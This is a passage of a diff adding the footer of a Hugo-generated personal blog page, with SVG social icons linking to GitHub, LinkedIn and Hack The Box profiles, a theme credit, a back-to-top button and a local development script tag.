+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
